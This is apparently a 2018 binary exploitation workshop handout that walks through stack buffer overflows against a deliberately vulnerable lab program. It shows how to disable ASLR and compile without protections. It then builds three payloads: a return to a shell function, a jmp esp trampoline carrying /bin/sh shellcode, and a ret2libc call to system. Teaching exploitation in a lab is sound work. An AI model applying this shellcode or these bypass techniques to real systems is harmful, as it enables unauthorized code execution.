# Binary Exploitation 2018
## Parker Garrison

```
To get started
	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
	You will need gdb-peda to execute some of the gdb commands such as checksec.

Memory and the Stack
	Ensure ASLR is off
		echo 0 > /proc/sys/kernel/randomize_va_space
	
	Compile segment_mem.c
		gcc segment_mem.c -o segment_mem
	
	Run this binary to examine addresses which are in various memory segments:
		./segment_mem
			Address of etext: 080485c8
			Address of edata: 0804989c
			Address of end: 080498a8
			Address in .text: 04244c8d
			Address in .data: 08048616
			Address in .data: 08049898
			Address in .bss: 080498a4
			Address in heap: 0804a008
			Address in stack: bffff4ee
			
Exploit Mitigations and Bypasses
	No Mitigations
		Compile wisdom.c without NX
			gcc wisdom.c -g -o wisdom.out -fno-stack-protector -z execstack
		
		Generate a cyclic pattern of length 300
			./pat_gen.py 300
		
		Compute the offset of the pattern
			./pat_ind.py [hexdigits]
		
		Display functions in the program
			gdb> info functions
		
		Print the address of shell function
			gdb> print shell
		
		Print escaped attack code to call shell function
			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'

		Execute wisdom.out while escaping input
			chmod +x runescape.sh
			./runescape.sh ./wisdom.out
		
		Ensure that pgrep will find the correct process
			ps -ef | grep wisdom
			
		Attach to gdb
			gdb -p $(pgrep wisdom)
		
		Detach from gdb
			gdb> detach
	
	Bypass ASLR, no NX with Trampoline
		Find useful ESP gadgets
			gdb-peda> jmpcall
		
		/bin/sh Shellcode from exploit-db in escaped format
			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
			
		Print escaped ASLR bypass exploit code
			Python file: 
				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
				nops = r"\x90" * 16
				addr =  r"\x8f\x8b\x04\x08" # This address contains a jmp esp
				
				print "A"*152 + addr + nops + sc
				
	
	Bypass NX with ret2libc
		Manually find address of "/bin/bash" string
			gdb> print wisdoms[1]
				$1 = 0x8048a08 "A great shell to use is /bin/bash"
			gdb> print wisdoms[1]+24
				$2 = 0x8048a20 "/bin/bash"
			
		Examine memory location as a string
			gdb-peda$ x/s 0x8048a20
				0x8048a20:	 "/bin/bash"
			
		
		Find addresses of functions
			gdb-peda$ p system
				$1 = {<text variable, no debug info>} 0xb7e503e0 <system>
			gdb-peda$ p exit
				$2 = {<text variable, no debug info>} 0xb7e431b0 <exit>
				
		Recompile wisdom.c with NX and no stack canaries
			gcc wisdom.c -g -o wisdom.out-nx -fno-stack-protector
			chmod +x runescape.sh
			./runescape.sh wisdom.out-nx
		
		Print escaped NX bypass exploit code
			Python file:
				addr_system_esc = r"\xe0\x03\xe5\xb7"
				addr_exit_esc = r"\xb0\x31\xe4\xb7"
				args = r"\x20\x8a\x04\x08"
				
				print "A"*152 + addr_system_esc + addr_exit_esc + args
```

